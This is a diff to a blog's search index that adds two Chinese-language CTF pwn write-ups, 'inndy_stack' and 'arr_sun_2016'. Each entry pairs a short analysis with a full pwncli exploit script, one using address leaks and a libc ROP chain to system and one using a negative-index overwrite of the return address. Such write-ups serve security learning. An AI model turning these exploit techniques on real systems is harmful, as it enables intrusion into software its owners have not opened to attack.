@@ -4,6 +4,76 @@
   
   
   <entry>
+    <title>inndy_stack</title>
+    <link href="/2022/12/10/inndy-stack/"/>
+    <url>/2022/12/10/inndy-stack/</url>
+    
+    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="/2022/12/10/inndy-stack/1.png"></p><ul><li>32位,保护全开</li></ul><p><img src="/2022/12/10/inndy-stack/2.png"></p><ul><li>实现了一个简单的栈</li></ul><p><img src="/2022/12/10/inndy-stack/3.png"></p><ul><li>pop</li></ul><p><img src="/2022/12/10/inndy-stack/4.png"></p><ul><li>push</li></ul><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ul><li>v6[0]是当前栈指针（esp），可以通过pop向后移动再push修改使其指向ret addr</li><li>可以通过pop泄露程序地址、栈地址和libc地址</li><li>泄露libc地址后ROP</li></ul><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># Date: 2022-12-08 14:20:13</span><br><span class="hljs-comment"># Link: https://github.com/RoderickChan/pwncli</span><br><span class="hljs-comment"># Usage:</span><br><span class="hljs-comment">#     Debug : python3 exp.py debug elf-file-path -t -b malloc</span><br><span class="hljs-comment">#     Remote: python3 exp.py remote elf-file-path ip:port</span><br><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br>libc: ELF = gift.libc<br><br><span class="hljs-comment"># one_gadgets: list = get_current_one_gadget_from_libc(more=False)</span><br>CurrentGadgets.set_find_area(find_in_elf=<span class="hljs-literal">True</span>, find_in_libc=<span class="hljs-literal">False</span>, do_initial=<span class="hljs-literal">False</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">i, prompt=<span class="hljs-string">&quot;Cmd &gt;&gt;\n&quot;</span></span>):<br>    sla(prompt, i)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>():<br>    cmd(<span class="hljs-string">&#x27;p&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">d</span>):<br>    cmd(<span class="hljs-string">&#x27;i&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(d))<br><br>pop()<br>pop()<br>pop()<br>ru(<span class="hljs-string">&quot;Pop -&gt; &quot;</span>)<br><br>libc=ELF(<span class="hljs-string">&quot;../libc/libc-2.23_32.so&quot;</span>)<br><span class="hljs-comment"># libc_base-=0x1D5B73</span><br><br>pop()<br>ru(<span class="hljs-string">&quot;Pop -&gt; &quot;</span>)<br>elf_base=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>,drop=<span class="hljs-literal">True</span>))<br>elf_base-=<span class="hljs-number">0x75a</span><br>pop()<br>pop()<br>ru(<span class="hljs-string">&quot;Pop -&gt; &quot;</span>)<br>stack=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>,drop=<span class="hljs-literal">True</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    push(<span class="hljs-number">0x59</span>)<br>pop()<br>ru(<span class="hljs-string">&quot;Pop -&gt; &quot;</span>)<br>libc_base=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>,drop=<span class="hljs-literal">True</span>))<br>libc_base-=<span class="hljs-number">0x18637</span><br>one=libc_base+<span class="hljs-number">0x3a80c</span><br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>push(<span class="hljs-number">16</span>)<br>push(<span class="hljs-number">16</span>)<br>push(<span class="hljs-number">16</span>)<br>push(<span class="hljs-number">16</span>)<br>push(system)<br>push(stack+<span class="hljs-number">0x78</span>)<br>push(libc_base+<span class="hljs-number">0x0015902b</span>)<br>cmd(<span class="hljs-string">&quot;x&quot;</span>)<br><span class="hljs-built_in">print</span>(libc_base)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(elf_base))<br>ia()<br><br></code></pre></td></tr></table></figure><p><img src="/2022/12/10/inndy-stack/5.png"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+      <category>BUU</category>
+      
+      <category>Pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+      <tag>BUU</tag>
+      
+      <tag>PWN</tag>
+      
+      <tag>WP</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>arr_sun_2016</title>
+    <link href="/2022/12/10/arr-sun-2016/"/>
+    <url>/2022/12/10/arr-sun-2016/</url>
+    
+    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="/2022/12/10/arr-sun-2016/1.png"></p><ul><li>没开PIE和RELRO</li></ul><p><img src="/2022/12/10/arr-sun-2016/2.png"></p><ul><li>有system函数</li></ul><p><img src="/2022/12/10/arr-sun-2016/3.png"></p><ul><li>v1为int，输入负数绕过对v1的检测，v5[v1]时将v1当成unsigned int用，因此可以修改v5后任意地址的值</li></ul><p><img src="/2022/12/10/arr-sun-2016/4.png"></p><ul><li>返回地址下面有一个栈地址，可以当作sh的指针</li></ul><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ul><li>修改返回地址为ret，再call system，目的是越过返回地址和栈地址中间的那个栈帧</li><li>修改栈地址为sh，距离返回地址的偏移为0x24</li></ul><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># Date: 2022-12-03 19:43:34</span><br><span class="hljs-comment"># Link: https://github.com/RoderickChan/pwncli</span><br><span class="hljs-comment"># Usage:</span><br><span class="hljs-comment">#     Debug : python3 exp.py debug elf-file-path -t -b malloc</span><br><span class="hljs-comment">#     Remote: python3 exp.py remote elf-file-path ip:port</span><br><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br>libc: ELF = gift.libc<br><br>rl()<br>sl(<span class="hljs-string">&quot;asd&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    rl()<br>    sl(<span class="hljs-built_in">str</span>(i))<br>    rl()<br>    sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">500</span>))<br><br>rl()<br>sl(<span class="hljs-string">&quot;-2147483635&quot;</span>)<br>rl()<br>sl(<span class="hljs-string">&quot;134514065&quot;</span>)<br>rl()<br>sl(<span class="hljs-string">&quot;-2147483634&quot;</span>)<br>rl()<br>sl(<span class="hljs-string">&quot;134514055&quot;</span>)<br>rl()<br>sl(<span class="hljs-string">&quot;-2147483626&quot;</span>)<br>rl()<br>sl(<span class="hljs-string">&quot;26739&quot;</span>)<br>ia()<br></code></pre></td></tr></table></figure><p><img src="/2022/12/10/arr-sun-2016/5.png"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+      <category>BUU</category>
+      
+      <category>Pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+      <tag>BUU</tag>
+      
+      <tag>PWN</tag>
+      
+      <tag>WP</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>浙理体育逆向分析</title>
     <link href="/2022/12/07/%E6%B5%99%E7%90%86%E4%BD%93%E8%82%B2%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
     <url>/2022/12/07/%E6%B5%99%E7%90%86%E4%BD%93%E8%82%B2%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
@@ -42,9 +112,9 @@
       
       <category>CTF</category>
       
-      <category>Pwn</category>
+      <category>BUU</category>
       
-      <category>WP</category>
+      <category>Pwn</category>
       
     </categories>
     
@@ -56,6 +126,8 @@
       <tag>BUU</tag>
       
       <tag>PWN</tag>
+      
+      <tag>WP</tag>
       
     </tags>
     
